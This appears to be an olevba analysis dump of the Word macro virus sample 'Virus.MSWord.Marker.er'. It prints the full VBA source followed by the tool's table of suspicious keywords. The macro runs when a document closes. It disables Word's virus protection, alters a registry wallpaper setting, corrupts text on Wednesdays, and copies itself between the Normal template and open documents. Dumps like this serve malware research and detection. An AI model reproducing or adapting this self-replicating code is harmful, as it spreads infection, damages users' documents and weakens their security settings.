olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.er
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.er - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

If (WeekDay(Now()) = vbWednesday) Then
    Application.ScreenUpdating = False
    ActiveWindow.WindowState = wdWindowStateMinimize
End If

Const Kuku = "Black Wednesday!"

'Declare Variables
Dim SaveDoc, SaveNormalTempl, DocInfected, NormalTemplInfected As Boolean
Dim ActDoc, NormTempl As Object
Dim MyCod, UserAddress, LogData, LogFile As String
Dim a1, FileLocal, FileServer As Integer

'Initialize Variables
Set ActDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NormTempl = NormalTemplate.VBProject.VBComponents.Item(1)

DocInfected = ActDoc.CodeModule.Find(Kuku, 1, 1, 10000, 10000)
NormalTemplInfected = NormTempl.CodeModule.Find(Kuku, 1, 1, 10000, 10000)

'Switch the VirusProtection OFF
Options.VirusProtection = False

System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", _
"WallPaper") = "c:\NetSetup.log"

If (WeekDay(Now()) = vbWednesday) Then
    Selection.MoveDown Unit:=wdLine, Count:=20, Extend:=wdExtend
    Selection.Range.Case = wdNextCase
    ActiveDocument.Save
End If
'Make sure that some conditions are true before we continue infecting anything
If (DocInfected = True Xor NormalTemplInfected = True) Then
  'Infect the NormalTemplate
  If DocInfected = True Then
 
    MyCod = ActDoc.CodeModule.Lines(1, ActDoc.CodeModule.CountOfLines)

    a1 = NormTempl.CodeModule.CountOfLines
    NormTempl.CodeModule.DeleteLines 1, a1
    NormTempl.CodeModule.AddFromString MyCod
    
    NormalTemplate.Save
  End If
              
  'Infect the ActiveDocument
  If NormalTemplInfected = True Then

    OurCode = NormTempl.CodeModule.Lines(1, NormTempl.CodeModule.CountOfLines)

    a1 = ActDoc.CodeModule.CountOfLines
    ActDoc.CodeModule.DeleteLines 1, a1
    ActDoc.CodeModule.AddFromString OurCode
    
    ActiveDocument.Save
  End If
End If
End Sub












+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

